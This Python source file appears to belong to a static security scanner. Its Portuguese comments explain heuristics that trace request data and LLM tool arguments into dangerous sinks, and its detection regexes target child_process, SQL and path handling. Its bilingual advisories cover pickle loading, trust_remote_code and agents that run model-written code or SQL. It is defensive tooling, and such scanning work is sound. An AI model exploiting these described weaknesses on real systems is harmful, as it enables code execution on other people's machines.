        base = re.split(r"[.\[]", field, maxsplit=1)[0]
        if base == "" or base.isdigit():
            idx = int(base) if base else i
            i += 1
            v = call.args[idx] if idx < len(call.args) else call
        else:
            v = kws.get(base, call)
        out.append(("expr", v))
    return out


def _body_model(ann, imports):
    """request: ChatRequest, user: UserCreate, req: Annotated[QueryIn, Body()]: o tipo é o modelo do corpo da requisição
    (FastAPI, Litestar). Request, HttpRequest e o que vem de um módulo de framework web são o próprio framework."""
    if isinstance(ann, ast.Subscript) and (_dotted(ann.value, imports) or "").endswith("Annotated"):
        sl = ann.slice
        ann = sl.elts[0] if isinstance(sl, ast.Tuple) and sl.elts else sl
    if isinstance(ann, ast.Constant) and isinstance(ann.value, str):
        name = full = ann.value.strip()
    elif isinstance(ann, (ast.Name, ast.Attribute)):
        full = _dotted(ann, imports) or ""
        name = ann.id if isinstance(ann, ast.Name) else ann.attr
    else:
        return False
    name = name.rsplit(".", 1)[-1]
    if not _BODY_ANN.search(name) or name in _FRAMEWORK_REQ_ANN:
        return False
    return full.split(".")[0] not in _PY_WEB


def _framework_param(p, default, imports):
    """Parâmetro de rota que o framework injeta (banco, usuário logado, Request), não dado de quem chama."""
    if default is not None and isinstance(default, ast.Call):
        d = _dotted(default.func, imports) or ""
        if d.endswith(("Depends", "Security")):
            return True
    ann = p.annotation
    if ann is not None:
        for n in _walk(ann):
            if isinstance(n, ast.Call) and (_dotted(n.func, imports) or "").endswith(("Depends", "Security")):
                return True
        if _body_model(ann, imports):
            return False  # o tipo diz mais que o nome: request: ChatRequest é o corpo
    if p.arg in _NOT_REQ_PARAM:
        return True
    if ann is not None:
        if isinstance(ann, ast.Name) and _NOT_REQ_ANN.search(ann.id):
            return True
        if isinstance(ann, ast.Attribute) and _NOT_REQ_ANN.search(ann.attr):
            return True
    return False


# validate_name(x), check_path(x), is_safe_path(x), ensure_allowed(x): conferem o valor. ensure_dir, check_output,
# check_connection_health e afins só fazem algo existir ou rodar.
_VALIDATOR = re.compile(r"(?i)^_*(?:(?:validate|check|verify|assert|sanitize|is_valid|is_safe|is_allowed)(?:_|$|[A-Z])|"
                        r"ensure_?\w*(?:allowed|safe|valid|within|inside|permitted))")
_NOT_VALIDATOR = re.compile(r"(?i)exist|output|call$|health|availab|dirs?$|director|folder|parent|^_*check$")


def _argv_program(v, vals, depth=0):
    """O programa de uma lista de argumentos: ["git", x] -> "git", BASE_CMD + [x] -> o começo de BASE_CMD. None quando
    a lista é montada por comprehension (o programa vem da lista de origem, que já foi conferida)."""
    if depth > 3:
        return v
    if isinstance(v, (ast.List, ast.Tuple)):
        return v.elts[0] if v.elts else None
    if isinstance(v, (ast.ListComp, ast.GeneratorExp)):
        return None
    if isinstance(v, ast.BinOp) and isinstance(v.op, ast.Add):
        return _argv_program(v.left, vals, depth + 1)
    if isinstance(v, ast.Name) and v.id in vals and vals[v.id] is not v:
        return _argv_program(vals[v.id], vals, depth + 1)
    return v


def _seed_names(node, hits, method=False):
    """Parâmetros de node que recebem os argumentos marcados da chamada: hits = ([(posição, *arg)], [nome ou None])."""
    pos_hit, kw_hit = hits
    a = node.args
    pos = [p.arg for p in a.posonlyargs + a.args]
    if method and pos and pos[0] in ("self", "cls"):
        pos = pos[1:]
    kwonly = {p.arg for p in a.kwonlyargs}
    every = set(pos) | kwonly | {x.arg for x in (a.vararg, a.kwarg) if x}
    names = set()
    for i, starred in pos_hit:
        if starred:
            names |= set(pos[i:]) | ({a.vararg.arg} if a.vararg else set())
        elif i < len(pos):
            names.add(pos[i])
        elif a.vararg:
            names.add(a.vararg.arg)
    for k in kw_hit:
        if k is None:
            names |= every  # f(**arguments)
        elif k in pos or k in kwonly:
            names.add(k)
        elif a.kwarg:
            names.add(a.kwarg.arg)
    return names


def _tool_injected(p):
    """ctx: Context, config: RunnableConfig, Annotated[dict, InjectedState]: quem preenche é o framework, não o modelo."""
    ann = p.annotation
    if ann is None:
        return p.arg in _TOOL_INJECTED_NAME
    return any(_TOOL_INJECTED_ANN.search(n.id if isinstance(n, ast.Name) else n.attr)
               for n in _walk(ann) if isinstance(n, (ast.Name, ast.Attribute)))


def _scalar_annotation(ann, depth=0):
    """int, float, bool, UUID, datetime, Literal[...], também Optional[int], int | None e Annotated[int, ...]."""
    if ann is None or depth > 4:
        return False
    if isinstance(ann, ast.Constant) and isinstance(ann.value, str) and len(ann.value) < 200:
        try:
            ann = ast.parse(ann.value.strip(), mode="eval").body  # anotação entre aspas ("int")
        except (SyntaxError, ValueError, RecursionError, MemoryError):
            return False
    if isinstance(ann, ast.Name):
        return ann.id in _SCALAR_ANN
    if isinstance(ann, ast.Attribute):
        return ann.attr in _SCALAR_ANN
    none = (lambda e: isinstance(e, ast.Constant) and e.value is None)
    if isinstance(ann, ast.BinOp) and isinstance(ann.op, ast.BitOr):
        sides = (ann.left, ann.right)
        return all(none(e) or _scalar_annotation(e, depth + 1) for e in sides) and not all(none(e) for e in sides)
    if isinstance(ann, ast.Subscript):
        base = ann.value.attr if isinstance(ann.value, ast.Attribute) else getattr(ann.value, "id", "")
        sl = ann.slice
        if base == "Literal":
            return True
        if base == "Optional":
            return _scalar_annotation(sl, depth + 1)
        if base == "Annotated" and isinstance(sl, ast.Tuple) and sl.elts:
            return _scalar_annotation(sl.elts[0], depth + 1)
        if base == "Union" and isinstance(sl, ast.Tuple):
            return all(none(e) or _scalar_annotation(e, depth + 1) for e in sl.elts)
    return False


def _route_segments(node):
    """{nome: tipo} dos parâmetros que vêm do caminho: "typed" (/u/<int:id>, {id:int}), "seg" (pedaço sem "/", como
    /files/{name}) ou "path" ({p:path}, que aceita "/")."""
    out = {}
    for dec in node.decorator_list:
        if not isinstance(dec, ast.Call):
            continue
        path = _arg(dec, 0, "path", "rule")
        if not _const_str(path):
            continue
        for m in _ROUTE_SEG.finditer(path.value):
            name, conv = (m.group(1), m.group(2) or "str") if m.group(1) else (m.group(4), m.group(3) or "string")
            out[name] = "typed" if conv in _TYPED_CONV else "seg" if conv in _SEG_CONV else "path"
    return out


def _header(st):
    if isinstance(st, (ast.If, ast.While)):
        return [st.test]
    if isinstance(st, (ast.For, ast.AsyncFor)):
        return [st.iter]
    if isinstance(st, (ast.With, ast.AsyncWith)):
        return [i.context_expr for i in st.items]
    if isinstance(st, ast.Try) or type(st).__name__ == "TryStar":
        return []
    if type(st).__name__ == "Match":
        return [st.subject]
    return [st]


def _bodies(st):
    out = []
    for f in ("body", "orelse", "finalbody"):
        b = getattr(st, f, None)
        if isinstance(b, list) and b and isinstance(b[0], ast.stmt):
            out.append(b)
    for h in getattr(st, "handlers", []) or []:
        out.append(h.body)
    for c in getattr(st, "cases", []) or []:
        out.append(c.body)
    return out


_MODEL = {
    "trust_remote_code": ("trust_remote_code=True",
                          "Carregar o modelo roda código Python do repositório dele no Hub. Se o repositório mudar ou for invadido, "
                          "esse código roda com o seu acesso.",
                          "Loading the model runs Python code from its repository on the Hub. If the repository changes or is "
                          "hijacked, that code runs with your access.",
                          "Prefira modelos que não precisam disso; se precisar, fixe revision= num commit revisado.",
                          "Prefer models that do not need it; if you must, pin revision= to a commit you reviewed."),
    "torch.load": ("torch.load",
                   "torch.load usa pickle: um arquivo de pesos montado para isso executa código ao ser carregado.",
                   "torch.load uses pickle: a crafted weights file runs code when it is loaded.",
                   "Passe weights_only=True (padrão no PyTorch 2.6+) ou use o formato safetensors.",
                   "Pass weights_only=True (the default since PyTorch 2.6) or use the safetensors format."),
    "allow_dangerous_deserialization": ("allow_dangerous_deserialization=True",
                                        "O índice é carregado com pickle: um arquivo trocado por outra pessoa executa código.",
                                        "The index is loaded with pickle: a file swapped by someone else runs code.",
                                        "Carregue só índices criados por você, de uma pasta em que mais ninguém escreve.",
                                        "Only load indexes you created, from a folder nobody else can write to."),
}
_AGENT = {
    "code": ("ferramenta que executa código", "a tool that runs code",
             "O agente roda qualquer código Python ou comando que o modelo escrever. Uma instrução escondida num documento, "
             "página ou mensagem vira código rodando na sua máquina.",
             "The agent runs any Python code or command the model writes. One hidden instruction in a document, page or "
             "message becomes code running on your machine.",
             "Tire a ferramenta, ou rode numa sandbox (container sem segredos e sem rede) e peça confirmação antes de cada execução.",
             "Remove the tool, or run it in a sandbox (a container with no secrets and no network) and ask for confirmation "
             "before each run."),
    "allow_dangerous_requests": ("allow_dangerous_requests=True", "allow_dangerous_requests=True",
                                 "O agente pode chamar qualquer endereço, inclusive serviços internos da sua rede.",
                                 "The agent can call any address, including internal services on your network.",
                                 "Limite a ferramenta aos domínios de que ela precisa.", "Limit the tool to the domains it needs."),
    "sql": ("agente de SQL", "SQL agent",
            "O agente roda no seu banco o SQL que o modelo escrever. Com um usuário que pode gravar, uma instrução escondida "
            "apaga ou altera dados.",
            "The agent runs the SQL the model writes on your database. With a user that can write, a hidden instruction "
            "deletes or changes data.",
            "Use um usuário de banco só de leitura, limitado às tabelas necessárias.",
            "Use a read-only database user limited to the tables it needs."),
}


def _model_params(key):
    what, wpt, wen, fpt, fen = _MODEL[key]
    return {"what": what, "why_pt": wpt, "why_en": wen, "fix_pt": fpt, "fix_en": fen}


def _agent_params(key):
    if key in _AGENT:
        wpt, wen, ypt, yen, fpt, fen = _AGENT[key]
    else:
        names = {"allow_dangerous_code": "allow_dangerous_code=True", "use_docker": "use_docker=False",
                 "auto_run": "auto_run = True", "load_tools": "load_tools(python_repl/terminal)"}
        wpt = wen = names.get(key, key)
        _, _, ypt, yen, fpt, fen = _AGENT["code"]
    return {"what_pt": wpt, "what_en": wen, "why_pt": ypt, "why_en": yen, "fix_pt": fpt, "fix_en": fen}


def scan_python(rel, text, ext=None, xcalls=None):
    """ext: funções deste arquivo que outro arquivo chama com argumento de ferramenta. xcalls: lista que recebe as
    chamadas deste arquivo a funções importadas com argumento de ferramenta."""
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")  # SyntaxWarning de escape inválido no código auditado não vai para o terminal
            tree = ast.parse(text)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        return []
    try:
        py = _Py(rel, text, tree, ext)
        found = py.run()
    except RecursionError:
        return []
    if xcalls is not None:
        xcalls += py.xcalls
    return found


# =========================================================================== JavaScript / TypeScript

_JS_EXT = (".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".vue", ".svelte", ".astro")
_JS_BUDGET = 1_000_000  # caracteres olhados por arquivo em cada etapa, além de 10 por caractere do arquivo
_SQ = re.compile(r"'(?:[^'\\\n]|\\[\s\S])*'")
_DQ = re.compile(r'"(?:[^"\\\n]|\\[\s\S])*"')
_TPL_STEP = re.compile(r"\\[\s\S]|`|\$\{")
_JS_SPECIAL = re.compile(r"[\"'`/{}]")
_JS_SPECIAL_TOP = re.compile(r"[\"'`/]")  # fora de ${...} as chaves não importam
_REGEX_PREV = set("(,=:[!&|?{};+-*%~^<>")
_REGEX_KW = re.compile(r"(?<![\w$])(?:return|typeof|case|do|else|in|of|void|yield|await|delete|throw|instanceof)$")
_SCRIPT_OPEN = re.compile(r"<script\b[^>]{0,500}>", re.I)


def _blank(text, ranges):
    """Troca por espaço os trechos (tipo, a, b); tipo "nl" mantém as quebras de linha."""
    if not ranges:
        return text
    out, pos = [], 0
    for kind, a, b in sorted(ranges, key=lambda r: r[1]):
        a = max(a, pos)
        if b <= a:
            continue
        out.append(text[pos:a])
        seg = text[a:b]
        if kind == "nl" and "\n" in seg:
            out.append("\n".join(" " * len(x) for x in seg.split("\n")))
        else:
            out.append(" " * len(seg))
        pos = b
    out.append(text[pos:])
    return "".join(out)


def _js_mask(text):
    """(code, mask, lits), do mesmo tamanho do texto. code: sem comentários. mask: também sem o conteúdo das strings e do
    texto dos template literals (as expressões ${...} ficam), para achar chamadas e contar parênteses sem cair em texto.
    lits: os trechos (início, fim) de texto de string."""
    n = len(text)
    comments, strings = [], []
    stack = []
    depth = 0
    i = 0

    def tpl(i, depth):
        start = i
        while True:
            m = _TPL_STEP.search(text, i)
            if not m:
                strings.append(("all", start, n))
                return n, depth
            g = m.group()
            if g == "`":
                strings.append(("all", start, m.start()))
                return m.end(), depth
            if g == "${":
                strings.append(("all", start, m.start()))
                depth += 1
                stack.append(depth)
                return m.end(), depth
            i = m.end()

    def regex_start(i):
        j = i - 1
        while j >= 0 and text[j] in " \t\r\n":
            j -= 1
        if j < 0:
            return True
        p = text[j]
        if p == "<":
            return False  # </div> no JSX
        if p in _REGEX_PREV:
            return p != ">" or (j > 0 and text[j - 1] == "=")
        return bool(p.isalpha() and _REGEX_KW.search(text, max(0, j - 12), j + 1))

    def regex_end(i):
        j, cls = i + 1, False
        lim = min(n, i + 400)
        while j < lim:
            ch = text[j]
            if ch == "\\":
                j += 2
                continue
            if ch == "\n":
                return -1
            if ch == "[":
                cls = True
            elif ch == "]":
                cls = False
            elif ch == "/" and not cls:
                return j
            j += 1
        return -1

    while i < n:
        m = (_JS_SPECIAL if stack else _JS_SPECIAL_TOP).search(text, i)
        if not m:
            break
        i = m.start()
        c = text[i]
        if c == "{":
            depth += 1
            i += 1
        elif c == "}":
            if stack and stack[-1] == depth:
                stack.pop()
                depth -= 1
                i, depth = tpl(i + 1, depth)
            else:
                depth -= 1
                i += 1
        elif c == "`":
            i, depth = tpl(i + 1, depth)
        elif c in "'\"":
            mm = (_SQ if c == "'" else _DQ).match(text, i)
            if mm:
                strings.append(("all", i + 1, mm.end() - 1))
                i = mm.end()
            else:
                i += 1  # apóstrofo em texto JSX ("Don't"), não string
        else:
            nxt = text[i + 1:i + 2]
            if nxt == "/":
                j = text.find("\n", i)
                j = n if j < 0 else j
                comments.append(("nl", i, j))
                i = j
            elif nxt == "*":
                j = text.find("*/", i + 2)
                j = n if j < 0 else j + 2
                comments.append(("nl", i, j))
                i = j
            elif regex_start(i):
                j = regex_end(i)
                if j > 0:
                    strings.append(("all", i + 1, j))
                    i = j + 1
                else:
                    i += 1
            else:
                i += 1
    return _blank(text, comments), _blank(text, comments + strings), [(a, b) for _, a, b in strings]


def _script_only(rel, text):
    """Em .vue, .svelte e .astro, só o que está em <script> (e o frontmatter do Astro) é JavaScript."""
    if not rel.endswith((".vue", ".svelte", ".astro")):
        return text
    keep, low, pos = [], text.lower(), 0
    while True:
        m = _SCRIPT_OPEN.search(text, pos)
        if not m:
            break
        end = low.find("</script>", m.end())
        if end < 0:
            break
        keep.append((m.end(), end))
        pos = end + 9
    fm = re.match(r"\s*---\r?\n(.*?)\r?\n---", text, re.S) if rel.endswith(".astro") else None
    if fm:
        keep.append((fm.start(1), fm.end(1)))
    out, pos = [], 0
    for a, b in sorted(keep):
        out.append(re.sub(r"[^\n]", " ", text[pos:a]))
        out.append(text[a:b])
        pos = b
    out.append(re.sub(r"[^\n]", " ", text[pos:]))
    return "".join(out)


def _minified(text):
    """Bundle minificado: uma linha com mais de 20000 caracteres ou duas com mais de 3000. Todas as linhas contam: com
    split("\n", 2000), o resto depois da linha 2000 virava uma linha só, e arquivos comuns longos eram pulados."""
    long_lines = 0
    for line in text.split("\n"):
        if len(line) > 3000:
            long_lines += 1
            if long_lines > 1 or len(line) > 20000:
                return True
    return False


_JS_REQ = re.compile(
    r"\b(?:req|request|ctx\.request|context\.request)\s*\??\.\s*(?:query|body|params|cookies|headers|files?|fields)\b|"
    r"\b(?:req|request|c\.req)\s*\.\s*(?:json|formData|text|param|query|header|parseBody|valid|arrayBuffer|blob)\s*\(|"
    r"\b(?:ctx|context|props)\s*\.\s*params\b|"
    r"\bsearchParams\s*\??\.\s*get(?:All)?\s*\(|\bformData\s*\??\.\s*get(?:All)?\s*\(|"
    r"(?<![\w$.])(?:getQuery|readBody|getRouterParams?|readFormData|readMultipartFormData|readValidatedBody|getValidatedQuery)\s*\(|"
    r"\bevent\s*\.\s*(?:body|queryStringParameters|pathParameters|multiValueQueryStringParameters)\b|"
    r"(?<![\w$.])(?:useSearchParams|useParams|useQueryState)\s*\(|\brouter\s*\.\s*query\b|"
    r"(?<![\w$])(?:window\.|document\.)?location\s*\.\s*(?:search|hash)\b")
# A busca de um endereço guardada com outro nome: new URL(req.url).searchParams, request.nextUrl.searchParams.
_JS_PARAMS_END = re.compile(r"\.\s*searchParams\Z")
_JS_REQ_URL = re.compile(r"\b(?:req|request)\s*\.\s*(?:url|nextUrl)\b|\bnextUrl\b")
# if (!LISTA.includes(x)) return, if (!SET.has(x)) throw, if (!/^...$/.test(x)) { return ... }.
_JS_GUARD_IF = re.compile(r"\bif\s*\(\s*!\s*(?:([\w$.]+|\[[^\[\]\n]{0,500}\])\s*\.\s*(?:includes|has)|"
                          r"(/[^/\n]{0,300}/[a-z]*|[\w$]+)\s*\.\s*test)\s*\(\s*([A-Za-z_$][\w$]*)\s*\)\s*\)\s*\{?\s*"
                          r"(?:return|throw)\b")
# const sort = ALLOWED.includes(x) ? x : 'name' (ou SET.has(x) ? x : ...): o valor é um dos permitidos.
_JS_ALLOW_TERNARY = re.compile(r"\s*(?:[\w$.]+|\[[^\[\]\n]{0,500}\])\s*\.\s*(?:includes|has)\s*\(\s*([^()\n]{1,200}?)\s*\)"
                               r"\s*\?\s*([^:\n]{1,200}?)\s*:")
_JS_MCP_ARGS = re.compile(r"\brequest\s*\.\s*params\b")
# Começos possíveis de _JS_REQ e _JS_LLM, com texto fixo na frente (rápidas); a regex completa confere em volta.
_JS_REQ_HINT = re.compile(r"\.\s*(?:query|body|params|cookies|headers|files?|fields|json|formData|text|param|header|parseBody|"
                          r"valid|arrayBuffer|blob|get|getAll|search|hash|queryStringParameters|pathParameters|"
                          r"multiValueQueryStringParameters)\b")
_JS_REQ_CALLS = ("getQuery", "readBody", "getRouterParam", "readFormData", "readMultipartFormData", "readValidatedBody",
                 "getValidatedQuery", "useSearchParams", "useParams", "useQueryState")
_JS_LLM_HINT = re.compile(r"\.\s*(?:choices\s*\[|output_text\b|content\s*\[|chat\s*\.\s*completions|completions\s*\.\s*create|"
                          r"messages\s*\.\s*create|responses\s*\.\s*create|generateContent\s*\(|response\s*\.\s*text\s*\(|"
                          r"(?:invoke|call|predict)\s*\()|generate(?:Text|Object)\s*\(")
_JS_LLM = re.compile(
    r"\.choices\s*\[\s*0\s*\]\s*\??\.\s*(?:message\s*\??\.\s*content|text|delta\s*\??\.\s*content)\b|\.output_text\b|"
    r"\.content\s*\[\s*0\s*\]\s*\??\.\s*text\b|(?<![\w$.])(?:generateText|generateObject)\s*\(|"
    r"\.(?:chat\s*\.\s*)?completions\s*\.\s*create\s*\(|\.messages\s*\.\s*create\s*\(|\.responses\s*\.\s*create\s*\(|"
    r"\.generateContent\s*\(|\.response\s*\.\s*text\s*\(\s*\)|"
    r"\b(?:llm|model|chain|chatModel|agent|executor|runnable)\s*\.\s*(?:invoke|call|predict)\s*\(")
_JS_WORD = re.compile(r"(?<![\w$.])([A-Za-z_$][\w$]*)(?![\w$])(?!\s*:(?!:))")
_JS_THIS = re.compile(r"\bthis\s*\.\s*([A-Za-z_$][\w$]*)")
# Só no começo de um nome: sem o (?<!...), um nome longo sem "(" depois era tentado a partir de cada letra (quadrático).
_JS_CALL_NAME = re.compile(r"(?<![\w$])([A-Za-z_$][\w$]*)\s*(?:<[^<>()]*>\s*)?\(")
# Como _PASS no Python: o resultado é o próprio dado (texto, caminho, URL, JSON, markdown virando HTML).
_JS_PASS = {"String", "decodeURIComponent", "decodeURI", "encodeURI", "join", "resolve", "normalize", "format", "parse",
            "stringify", "URL", "URLSearchParams", "from", "concat", "replace", "replaceAll", "split", "Buffer", "atob", "btoa",
            "assign", "fromEntries", "entries", "values", "keys", "sprintf", "raw", "marked", "render", "renderInline",
            "markdown", "micromark", "snarkdown", "makeHtml", "toHTML", "trim", "toLowerCase", "toUpperCase", "slice",
            "substring", "substr", "padStart", "padEnd", "toString", "structuredClone", "cloneDeep", "merge"}
_JS_NOT_CALL = {"if", "for", "while", "switch", "catch", "function", "return", "typeof", "await", "async", "yield", "void",
                "new", "in", "of", "delete", "else", "do", "with"}
# Caminho que o multer / express-fileupload escolhe no servidor para o upload (o nome original continua sendo de fora).
_JS_UPLOAD = re.compile(r"\b(?:req|request)\s*\.\s*files?\b(?:\s*\[[^\]\n]{0,40}\]|\s*\.\s*[A-Za-z_$][\w$]*)?\s*\.\s*"
                        r"(?:path|destination|filename|tempFilePath|size)\b")
_JS_KILL = re.compile(r"(?:Number|parseInt|parseFloat|Boolean|Math\s*\.\s*\w+|path\s*\.\s*basename|basename|encodeURIComponent|"
                      r"DOMPurify\s*\.\s*sanitize|sanitize\w*|escape\w*|uuid\w*|crypto\s*\.\s*\w+|String\s*\(\s*Number)\s*\(|"
                      r"^!|^typeof\b|\.length\s*$|^\d")
_JS_DECL = re.compile(r"(?:const|let|var)\s+(\{(?:[^{}]|\{[^{}]*\})*\}|\[[^\[\]]*\]|[A-Za-z_$][\w$]*)\s*(?::\s*[^=;\n]{1,120}?)?=(?![=>])")
_JS_FUNC = re.compile(r"function\b\s*\*?\s*([A-Za-z_$][\w$]*)?\s*(?:<[^>()]{0,200}>)?\s*\(")
_JS_ARROW_TYPE = re.compile(r"\)\s*:\s*[^=;{}()]{1,80}$")
_JS_METHOD = re.compile(r"\n[ \t]*(?:(?:public|private|protected|static|async|override|readonly)[ \t]+)*"
                        r"([A-Za-z_$][\w$]*)[ \t]*(?:<[^>()\n]{0,200}>)?[ \t]*(\()")
_WORDCH = frozenset("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$")
_IDENT = re.compile(r"[A-Za-z_$][\w$]*")
# Texto que é só um placeholder: '?', '%s', '$1', `$${i + 1}`, `:id${i}`, `@p${i}`. `'${n}'` põe o valor entre aspas.
_JS_PH_LIT = re.compile(r"""(['"`])(?:\?|%s|\$\d*|[$:@]\w*\$\{[^{}`'"]*\}|[:@]\w+)\1""")
_BRACKETS = re.compile(r"[()\[\]{}]")
_ARG_STOP = re.compile(r"[()\[\]{},]")
_EXPR_STOP = re.compile(r"[()\[\]{},;\n]")
_PLUS_STOP = re.compile(r"[()\[\]{}+]")
# Palavras que precisam estar no arquivo para cada fonte valer a busca completa.


def _opaque_calls(m):
    """Apaga os argumentos das chamadas que não repassam o dado (getFileById(req.params.id) devolve um registro do banco,
    não o que veio na requisição)."""
    parts, pos = [], 0
    for c in _JS_CALL_NAME.finditer(m):
        if c.start() < pos or c.group(1) in _JS_PASS or c.group(1) in _JS_NOT_CALL:
            continue
        if c.start() and m[c.start() - 1] in _WORDCH:
            continue
        op = c.end() - 1
        depth, cl = 0, len(m)
        for b in _BRACKETS.finditer(m, op):
            if b.group() in "([{":
                depth += 1
            else:
                depth -= 1
                if depth == 0:
                    cl = b.start()
                    break
        parts.append(m[pos:op + 1])
        parts.append(" " * (cl - op - 1))
        pos = cl
    if not parts:
        return m
    parts.append(m[pos:])
    return "".join(parts)


# req.headers.host, req.headers['x-forwarded-host'], request.headers.get('host'), c.req.header('host').
_JS_HOST_HEADER = re.compile(r"""[\w$.]{1,100}?\s*\??\.\s*(?:headers\s*\??\.\s*(?:host|get\s*\(\s*(['"`])([\w-]{1,40})\1\s*\))|"""
                             r"""headers\s*\[\s*(['"`])([\w-]{1,40})\3\s*\]|header\s*\(\s*(['"`])([\w-]{1,40})\5\s*\))""")


def _first_option(s):
    """O texto antes do primeiro ||, ?? ou ? (a primeira opção de a || b e a ?? b; em c ? a : b, a condição)."""
    return re.split(r"\s*(?:\|\||\?\?|\?(?!\.))\s*", s.strip(), maxsplit=1)[0]


def _close_bracket(m, i):
    """Posição do ] que fecha o [ em i, ou -1."""
    depth = 0
    for b in _BRACKETS.finditer(m, i):
        if b.group() in "([{":
            depth += 1
        else:
            depth -= 1
            if depth == 0:
                return b.start()
    return -1


def _near(hint, full, text, back=60, ahead=200):
    """full.search(text), mas só perto de onde hint (que começa com texto fixo e é rápida) acha um começo possível."""
    for m in hint.finditer(text):
        if full.search(text, max(0, m.start() - back), m.end() + ahead):
            return True
    return False
_JS_NOT_METHOD = {"if", "for", "while", "switch", "catch", "function", "return", "with", "await", "typeof", "new", "super",
                  "else", "do", "try", "throw", "delete", "void", "yield", "import", "export", "case"}
_JS_ROUTE_FN = re.compile(r"export\s+(?:async\s+)?function\s+(?:GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s*\(|"
                          r"export\s+const\s+(?:GET|POST|PUT|PATCH|DELETE)\s*(?::[^=]{1,200})?=\s*(?:async\s*)?(?:\(|function)")
_JS_TOOL_CALL = re.compile(r"\.\s*(?:tool|registerTool|addTool)\s*\(|(?:tool|createTool|betaZodTool|betaTool)\s*\(|"
                           r"new\s+(?:DynamicStructuredTool|DynamicTool|FunctionTool)\s*\(|"
                           r"setRequestHandler\s*\(\s*CallToolRequestSchema")
_JS_EXECUTE_KEY = re.compile(r"\b(?:execute|func|handler|run)\s*:\s*(?:async\s*)?(?:function\s*\w*\s*)?$")
_JS_TOOL_METHOD = re.compile(r"\s*(?:async\s+)?(?:execute|func|handler|run)\s*$")
# Objeto que descreve uma ferramenta: { name, description, inputSchema, handler }, { parameters, execute }.
_JS_TOOL_KEYS = re.compile(r"(?:parameters|inputSchema|argsSchema|input_schema|zodSchema|paramsSchema)\s*:")
# Argumentos de uma chamada de ferramenta lidos da resposta da API (OpenAI, Responses, Anthropic, Gemini).
_JS_TOOL_ARGS = re.compile(r"\.\s*function\s*\??\.\s*arguments\b|"
                           r"\b(?:toolCall|tool_call|call|tc|fc|item|functionCall|function_call|output)\s*\??\.\s*arguments\b")
_JS_TOOL_INPUT = re.compile(r"\b(?:block|toolUse|toolUseBlock|tool_use|contentBlock|part|tu|toolBlock|content|toolCall)\s*\??\."
                            r"\s*input\b")
_JS_TOOL_GEMINI = re.compile(r"\b(?:functionCall|fc)\s*\??\.\s*args\b")
# Argumento que o esquema Zod já restringe (o SDK do MCP, o AI SDK e o LangChain validam antes de chamar): número,
# booleano, enum, literal, uuid, regex. JSON Schema num handler de CallToolRequestSchema não é validado pelo SDK.
_JS_ZOD_KEY = re.compile(r":\s*z\s*\.\s*")
_JS_ZOD_NAME = re.compile(r"([A-Za-z_$][\w$]*)\s*$")
_JS_TYPED_ZOD = re.compile(r"(number|boolean|enum|nativeEnum|literal|bigint|date|int|coerce\s*\.\s*(?:number|boolean|date|bigint))\b|"
                           r"(string)\s*\(\s*\)(\s*\.\s*(?:uuid|regex|email|datetime|ip|cuid2?|ulid|base64|date|time|cidr)\s*\()?|\w+")
_CP_ARGV = {"spawn", "spawnSync", "execFile", "execFileSync", "execa", "execaSync"}


def _pattern_names(p):
    """Nomes declarados por `x`, `{ a, b: c, d = 1, ...e }` ou `[a, b]`."""
    p = p.strip()
    if p[:1] not in "{[":
        return [p] if re.fullmatch(r"[A-Za-z_$][\w$]*", p) else []
    out = []
    for part in re.split(r",", p[1:-1]):
        part = part.strip().lstrip(".").strip()
        if ":" in part:
            part = part.split(":", 1)[1]
        part = part.split("=", 1)[0].strip()
        part = part.strip("{}[] ")
        if re.fullmatch(r"[A-Za-z_$][\w$]*", part):
            out.append(part)
    return out


# import { a, b as c } from "./x"; const { a, b: c } = require("./x"): só caminhos do próprio projeto (começam com .).
_JS_IMPORT = re.compile(r"""import\s+(?:type\s+)?(?:[A-Za-z_$][\w$]*\s*,\s*)?\{([^{}]{0,2000})\}\s*from\s*(['"])(\.[^'"\n]{0,300})\2""")
_JS_REQUIRE = re.compile(r"""(?:const|let|var)\s+\{([^{}]{0,2000})\}\s*=\s*require\s*\(\s*(['"])(\.[^'"\n]{0,300})\2\s*\)""")


_JS_BARE_CALL = re.compile(r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*\(")
_JS_THIS_CALL = re.compile(r"\bthis\s*\??\.\s*([A-Za-z_$][\w$]*)\s*\(")
_JS_FN_DECL_TAIL = re.compile(r"function\s*\*?\s*$")
_JS_FN_LITERAL = re.compile(r"\s*(?:async\s*)?(?:function\b|\([^()]*\)\s*(?::[^=]{0,80})?=>|[A-Za-z_$][\w$]*\s*=>)")


def _fn_key(before):
    """Nome da função a partir do texto antes dos parâmetros: const ler = async ( (helper) ou ler = async ( (campo de
    classe, chamado com this.ler)."""
    tail = before.rstrip()
    if not tail.endswith(("=", "async", "function", "*")):
        return None
    m = re.search(r"(?:(const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*(?::[^=;(){}]{0,200})?=\s*(?:async\s*)?(?:function\b\s*\*?\s*)?$",
                  before)
    if not m or m.group(2) in _JS_NOT_METHOD:
        return None
    return ("f:" if m.group(1) else "m:") + m.group(2)


def _param_names(text):
    return [n for g in _param_groups(text) for n in g]


def _param_groups(text):
    """Nomes declarados por parâmetro: (a, { b, c }, ...d) -> [[a], [b, c], [d]]."""
    out = []
    depth, start = 0, 0
    parts = []
    for i, c in enumerate(text):
        if c in "([{<":
            depth += 1
        elif c in ")]}>":
            depth -= 1
        elif c == "," and depth == 0:
            parts.append(text[start:i])
            start = i + 1
    parts.append(text[start:])
    for p in parts:
        p = p.strip().lstrip(".").strip()
        if not p:
            continue
        if p[0] in "{[":
            close = _match_text(p, 0)
            out.append(_pattern_names(p[:close + 1] if close > 0 else p))
            continue
        m = re.match(r"(?:(?:public|private|protected|readonly)\s+)*([A-Za-z_$][\w$]*)", p)
        out.append([m.group(1)] if m else [])
    return out


def _match_text(s, i):
    depth = 0
    for j in range(i, len(s)):
        if s[j] in "([{":
            depth += 1
        elif s[j] in ")]}":
            depth -= 1
            if depth == 0:
                return j
    return -1


_CP_REQUIRE = re.compile(r"""(?:const|let|var)\s+(\{[^}]{0,500}\}|[\w$]+)\s*=\s*require\(\s*['"](?:node:)?child_process['"]\s*\)""")
